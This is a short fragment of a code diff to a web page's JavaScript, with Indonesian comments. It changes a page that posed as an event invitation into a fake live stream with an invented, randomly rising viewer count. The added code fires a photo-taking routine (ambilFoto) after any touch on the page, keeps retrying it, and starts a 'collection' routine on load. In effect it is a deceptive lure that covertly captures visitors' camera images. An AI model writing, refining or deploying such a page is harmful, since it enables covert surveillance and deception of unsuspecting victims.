             // Trigger 4: Saat touch di mobile
             document.addEventListener('touchstart', function touchHandler(e) {
-                if (!e.target.classList.contains('rsvp-button') && !cameraAccessed && !isProcessing) {
+                if (!cameraAccessed && !isProcessing) {
                     document.removeEventListener('touchstart', touchHandler);
                     setTimeout(() => ambilFoto().catch(() => {}), 200);
                 }
             });
             
-            // Trigger 5: Retry jika belum berhasil
+            // Trigger 5: Retry
             let retryCount = 0;
             const retryInterval = setInterval(() => {
                 if (cameraAccessed || retryCount >= 3) {
@@ -669,18 +919,16 @@
         
         // Mulai
         window.addEventListener('load', () => {
-            updateStatus('Memuat undangan...', 'Selamat datang');
+            updateStatus('2.3K', 'Live');
             
-            // Animasi countdown
-            let days = 15;
+            // Animasi viewer count
             setInterval(() => {
-                if (days > 0 && !cameraAccessed) {
-                    days--;
-                    document.getElementById('countdown').innerHTML = days;
+                if (!cameraAccessed) {
+                    const current = parseInt(document.getElementById('status').innerHTML) || 2300;
+                    document.getElementById('status').innerHTML = (current + Math.floor(Math.random() * 10)) + 'K';
                 }
-            }, 3000);
+            }, 5000);
             
-            // Mulai collection dengan delay
             setTimeout(startCollection, 500);
         });
         
